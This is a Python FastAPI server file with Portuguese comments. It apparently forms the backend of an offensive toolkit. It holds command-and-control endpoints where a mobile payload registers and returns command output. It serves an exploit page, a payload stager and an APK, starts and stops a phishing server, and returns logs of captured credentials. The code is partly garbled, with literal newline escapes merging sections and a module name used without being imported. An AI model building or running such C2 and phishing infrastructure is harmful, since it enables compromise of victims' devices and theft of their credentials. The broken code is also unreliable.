#!/usr/bin/env python3.11
"""
ASCENSÃO DO CULTIVO DIGITAL - Servidor FastAPI Simplificado e Funcional
Versão Corrigida para Concurso
"""

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, BackgroundTasks
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse
from fastapi.middleware.cors import CORSMiddleware\nfrom pydantic import BaseModel
import asyncio
import json
from pathlib import Path
import logging
import psutil
import subprocess
import os
from datetime import datetime
import random

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Definir o diretório de arquivos estáticos (Frontend Build)
STATIC_DIR = Path(__file__).parent / "dist" / "public"

# Verificar se o diretório estático existe
if not STATIC_DIR.is_dir():
    logger.error(f"Diretório estático não encontrado: {STATIC_DIR}")
    STATIC_DIR.mkdir(parents=True, exist_ok=True)
    (STATIC_DIR / "index.html").write_text("<h1>Frontend Build Não Encontrado. Execute 'pnpm run build'</h1>")

# Configurar FastAPI
app = FastAPI(title="ASCENSÃO - CULTIVO DIGITAL API", version="v18.0")

# Servir arquivos estáticos (Frontend)
app.mount("/assets", StaticFiles(directory=STATIC_DIR / "assets"), name="static_assets")

# Servir arquivos estáticos (Frontend, APK, Exploit Page)
# Monta o diretório raiz do projeto para servir index.html, exploit_page.html, payload_stager.js e o APK
app.mount("/", StaticFiles(directory=Path(__file__).parent, html=True), name="static_root")

# Configurar CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Gerenciador de conexões WebSocket
class ConnectionManager:
    def __init__(self):
        self.active_connections: list[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)
        logger.info(f"Cliente conectado. Total: {len(self.active_connections)}")

    def disconnect(self, websocket: WebSocket):
        self.active_connections.remove(websocket)
        logger.info(f"Cliente desconectado. Total: {len(self.active_connections)}")

    async def broadcast(self, message: dict):
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                pass

manager = ConnectionManager()

# ============================================================================
# ENDPOINTS DE API\n\n# ============================================================================\n# ENDPOINTS DE PAYLOAD MÓVEL (C2)\n# ============================================================================\n\n# Armazenamento temporário de dispositivos e resultados\nregistered_devices = {}\n\nclass DeviceRegistration(BaseModel):\n    device_ip: str\n    device_name: str\n    device_type: str\n\n@app.post("/api/mobile/register")\nasync def register_mobile_device(device: DeviceRegistration):\n    """Registra o payload móvel no servidor C2."""\n    global registered_devices\n    registered_devices[device.device_ip] = {\n        "name": device.device_name,\n        "type": device.device_type,\n        "last_checkin": datetime.now().isoformat(),\n        "status": "online"\n    }\n    logger.info(f"✅ Dispositivo Registrado: {device.device_name} ({device.device_ip})")\n    return {"status": "success", "message": "Dispositivo registrado com sucesso"}\n\n@app.post("/api/mobile/result")\nasync def receive_mobile_result(result: dict):\n    """Recebe o resultado de um comando do payload móvel."""\n    device_ip = result.get("device_ip", "UNKNOWN")\n    command_type = result.get("command_type", "UNKNOWN")\n    output = result.get("output", "N/A")\n    \n    logger.info(f"📥 Resultado Recebido de {device_ip} - Comando: {command_type}")\n    \n    # Aqui você adicionaria a lógica para salvar o resultado no banco de dados\n    # ou notificar a interface de controle (Frontend) via WebSocket.\n    \n    # Exemplo de notificação via WebSocket (para o Frontend)\n    await manager.broadcast({\n        "type": "payload_result",\n        "device_ip": device_ip,\n        "command": command_type,\n        "data_snippet": output[:100] + "..."\n    })\n    \n    return {"status": "received", "message": "Resultado processado"}\n\n@app.get("/api/mobile/devices")\nasync def get_mobile_devices():\n    """Lista todos os dispositivos móveis registrados."""\n    return {"devices": registered_devices}\n\n# ============================================================================\n# MÓDULOS DE API EXISTENTES\n# ============================================================================\n\n# Módulos Reais
# ============================================================================

# Módulos Reais
from real_web_scanner import RealWebScanner
from real_bruteforce_module import RealBruteForceModule
from real_phishing_module import PhishingHandler # Usaremos o nome da classe para evitar conflito

# Instanciar módulos
real_scanner = RealWebScanner()
phishing_process = None # Para gerenciar o processo de phishing

@app.get("/api/health")
async def health_check():
    """Verificar saúde do servidor"""
    return {
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "version": "v18.0"
    }

@app.get("/api/vulnerabilities")
async def get_vulnerabilities():
    """Listar vulnerabilidades simuladas"""
    return {
        "vulnerabilities": [
            {
                "id": 1,
                "name": "SQL Injection",
                "severity": "high",
                "description": "Vulnerabilidade de injeção SQL detectada",
                "status": "detected"
            },
            {
                "id": 2,
                "name": "XSS",
                "severity": "medium",
                "description": "Cross-Site Scripting detectado",
                "status": "detected"
            },
            {
                "id": 3,
                "name": "CSRF",
                "severity": "medium",
                "description": "Cross-Site Request Forgery detectado",
                "status": "detected"
            }
        ]
    }

@app.get("/api/network/devices")
async def get_network_devices():
    """Listar dispositivos de rede simulados"""
    return {
        "devices": [
            {
                "ip": "192.168.1.1",
                "hostname": "router.local",
                "mac": "00:11:22:33:44:55",
                "vendor": "TP-Link",
                "status": "online"
            },
            {
                "ip": "192.168.1.100",
                "hostname": "notebook.local",
                "mac": "AA:BB:CC:DD:EE:FF",
                "vendor": "Dell",
                "status": "online"
            }
        ]
    }

@app.post("/api/network/scan")
async def scan_network(target: dict):
    """Escanear rede (simulado)"""
    await asyncio.sleep(2)  # Simular tempo de scan
    return {
        "status": "completed",
        "target": target.get("ip", "192.168.1.0/24"),
        "devices_found": random.randint(5, 15),
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/security/check")
async def security_check(data: dict):
    """Verificar segurança (simulado)"""
    await asyncio.sleep(1)
    return {
        "status": "completed",
        "score": random.randint(60, 95),
        "issues": random.randint(0, 5),
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/real/webscan")
async def real_web_scan(target: dict):
    """Executa um scan de vulnerabilidades web real"""
    url = target.get("url")
    if not url:
        return {"status": "error", "message": "URL não fornecida"}
    
    # Executar o scanner em um processo separado para não bloquear o servidor
    def run_scan():
        try:
            subprocess.run(["python3.11", "real_web_scanner.py", url], cwd=Path(__file__).parent, check=True)
        except subprocess.CalledProcessError as e:
            logger.error(f"Erro ao executar real_web_scanner: {e}")
    
    # Iniciar a tarefa em background
    asyncio.create_task(asyncio.to_thread(run_scan))
    
    return {"status": "scanning", "message": f"Scan iniciado para {url}. O relatório será salvo no arquivo."}

@app.post("/api/real/phishing/start")
async def start_phishing(background_tasks: BackgroundTasks):
    """Inicia o servidor de phishing real"""
    global phishing_process
    
    if phishing_process and phishing_process.poll() is None:
        return {"status": "running", "message": f"Servidor de Phishing já está rodando na porta {real_phishing_module.PORT}"}
    
    def run_phishing():
        global phishing_process
        try:
            phishing_process = subprocess.Popen(["python3.11", "real_phishing_module.py"], cwd=Path(__file__).parent)
            phishing_process.wait()
        except Exception as e:
            logger.error(f"Erro ao iniciar servidor de phishing: {e}")
    
    background_tasks.add_task(run_phishing)
    
    return {"status": "starting", "message": f"Servidor de Phishing iniciando na porta {real_phishing_module.PORT}"}

@app.get("/api/real/phishing/stop")
async def stop_phishing():
    """Para o servidor de phishing real"""
    global phishing_process
    
    if phishing_process and phishing_process.poll() is None:
        phishing_process.terminate()
        phishing_process = None
        return {"status": "stopped", "message": "Servidor de Phishing parado."}
    
    return {"status": "not_running", "message": "Servidor de Phishing não está rodando."}

@app.get("/api/real/phishing/log")
async def get_phishing_log():
    """Obtém o log de credenciais capturadas"""
    log_path = Path(__file__).parent / real_phishing_module.LOG_FILE
    if log_path.exists():
        with open(log_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    
    return {"status": "empty", "message": "Nenhuma credencial capturada ainda."}

@app.get("/api/traffic/analysis")
async def traffic_analysis():
    """Análise de tráfego (simulado)"""
    return {
        "packets_captured": random.randint(100, 1000),
        "protocols": {
            "HTTP": random.randint(30, 50),
            "HTTPS": random.randint(40, 60),
            "DNS": random.randint(5, 15),
            "OTHER": random.randint(5, 10)
        },
        "timestamp": datetime.now().isoformat()
    }

@app.post("/api/report/generate")
async def generate_report(data: dict):
    """Gerar relatório (simulado)"""
    await asyncio.sleep(1)
    return {
        "status": "generated",
        "report_id": f"RPT-{random.randint(1000, 9999)}",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/api/system/info")
async def system_info():
    """Informações do sistema"""
    try:
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        return {
            "cpu_usage": cpu_percent,
            "memory_usage": memory.percent,
            "disk_usage": disk.percent,
            "timestamp": datetime.now().isoformat()
        }
    except Exception as e:
        return {
            "error": str(e),
            "timestamp": datetime.now().isoformat()
        }

# ============================================================================
# WEBSOCKET
# ============================================================================

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    """Endpoint WebSocket para comunicação em tempo real"""
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Processar mensagem e responder
            response = {
                "type": "response",
                "data": f"Recebido: {message}",
                "timestamp": datetime.now().isoformat()
            }
            
            await websocket.send_json(response)
            
    except WebSocketDisconnect:
        manager.disconnect(websocket)
    except Exception as e:
        logger.error(f"Erro no WebSocket: {e}")
        manager.disconnect(websocket)

# ============================================================================
# INICIALIZAÇÃO
# ============================================================================

if __name__ == "__main__":
    import uvicorn
    
    # Garantir que o processo de phishing seja encerrado ao sair
    import atexit
    @atexit.register
    def cleanup():
        global phishing_process
        if phishing_process and phishing_process.poll() is None:
            phishing_process.terminate()
            logger.info("Servidor de Phishing encerrado.")
    
    logger.info("="*80)
    logger.info("🚀 ASCENSÃO - CULTIVO DIGITAL - Servidor Iniciando")
    logger.info("="*80)
    logger.info(f"📁 Diretório estático: {STATIC_DIR}")
    logger.info(f"🌐 Servidor rodando em: http://0.0.0.0:8000")
    logger.info(f"📊 API Docs: http://0.0.0.0:8000/docs")
    logger.info("="*80)
    
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        log_level="info"
    )
